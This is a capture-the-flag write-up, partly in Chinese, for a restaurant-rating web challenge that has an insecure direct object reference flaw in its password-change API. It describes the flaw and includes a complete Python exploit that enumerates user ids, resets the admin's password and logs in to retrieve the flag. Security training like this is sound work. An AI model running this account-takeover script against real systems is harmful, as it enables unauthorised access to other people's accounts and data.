# X-069-24 IDOR Eats
## 题目描述

> This challenge simulates a dynamic restaurant search platform that allows food lovers to explore and rate dining options based on their personal preferences. Yet, this platform presents a significant security risk due to an Insecure Direct Object Reference (IDOR) vulnerability. Specifically, by manipulating parameters in the URL, an authorized user with low privileges could potentially change another user鈥檚(or admin's) password, accessing their personal data, preferences and the FLAG.

## 知识点

越权

## 解题思路

存在注册、登录、个人中心（可修改密码）等常见功能。登录后在个人中心能看到“修改密码”弹窗，且页面会异步加载“我的收藏餐馆”等数据。

尝试在“修改密码”或数据查询接口中，是否存在可控的用户标识字段（如 `userId`）。如果接口只校验“当前会话是否登录”，但未校验“被操作对象是否属于当前会话用户”，就可能通过传入他人的 `userId` 来越权修改对方（如 admin）的密码。

修改密码接口（`/api/change_password.php`）需要提供 `oldPassword/newPassword/confirmPassword` 以及一个可控的 `userId` 参数。接口会先用“当前会话用户”的旧密码做校验，但最终执行 `UPDATE` 时却根据我们传入的 `userId` 更新该 id 用户的密码，导致越权。
## 解题步骤

1. 注册一个新用户并登录，得到会话 Cookie。
2. 调用修改密码接口，把 `oldPassword` 填自己的旧密码、`userId` 直接指定为 admin 的 id（通过测试得到 admin 的 id 为 `7`）。
![image.png](https://x/x12115616056.png)

3. 越权成功后，用我们设置的新密码登录 `admin` 账号。
4. 访问 `/profile.php`，管理员页面会直接显示 `FLAG`。
![image.png](https://x/x12115721081.png)

## EXP
```python
import re
import time
import random
import string
import requests

BASE = "http://ip32831"

s = requests.Session()


def register(u, email, pwd):
    r = s.post(f"{BASE}/api/register.php", data={
        "username": u,
        "email": email,
        "password": pwd,
    })
    print("[+] register:", r.status_code, r.text.strip())
    return r


def login(u, pwd):
    r = s.post(f"{BASE}/api/login.php", data={
        "username": u,
        "password": pwd,
    })
    print("[+] login as", u, ":", r.status_code, r.text.strip())
    return r


def enum_admin_id(max_id=50):
    for i in range(1, max_id + 1):
        r = s.get(f"{BASE}/api/get_favorite_restaurants.php?userId={i}")
        try:
            j = r.json()
            if j.get("success") and j.get("data", {}).get("username") == "admin":
                print("[+] found admin id:", i)
                return i
        except Exception:
            pass
    print("[!] admin id not found in 1..%d, fallback to 7" % max_id)
    return 7


def change_password(target_id, old_pwd, new_pwd):
    r = s.post(f"{BASE}/api/change_password.php", data={
        "oldPassword": old_pwd,
        "newPassword": new_pwd,
        "confirmPassword": new_pwd,
        "userId": target_id,
    })
    print("[+] change_password for", target_id, ":", r.status_code, r.text.strip())
    return r


def fetch_flag():
    r = s.get(f"{BASE}/profile.php", allow_redirects=True)
    print("[+] profile status:", r.status_code, "final_url:", getattr(r, "url", ""))

    u = re.search(r"<h1>\s*([^<]+)\s*</h1>", r.text)
    if u:
        print("[+] page username:", u.group(1).strip())

    m = re.search(r'id=["\']ctf-flag["\'][\s\S]*?FLAG\s*:\s*([^<]+)', r.text, re.I)
    if not m:
        m = re.search(r"FLAG\s*:\s*([^<\n\r]+)", r.text, re.I)

    if not m:
        m2 = re.search(r"FLAG\{[^}]+\}", r.text, re.I)
        if m2:
            print("[+] FLAG:", m2.group(0).strip())
            return r.text
    if m:
        print("[+] FLAG:", m.group(1).strip())
    else:
        print("[!] FLAG not found. Save/print page for manual check.")

    return r.text


if __name__ == "__main__":
    # 随机用户名避免重名导致注册/登录失败
    suffix = str(int(time.time()) % 100000) + ''.join(random.choice(string.ascii_lowercase) for _ in range(3))
    user = f"xb{suffix}"
    email = f"{user}@ex.com"
    pwd = "t1234567"
    new_admin_pwd = "Adm1nNnn!"

    register(user, email, pwd)
    login(user, pwd)
    admin_id = enum_admin_id()
    change_password(admin_id, pwd, new_admin_pwd)
    login("admin", new_admin_pwd)
    fetch_flag()

```
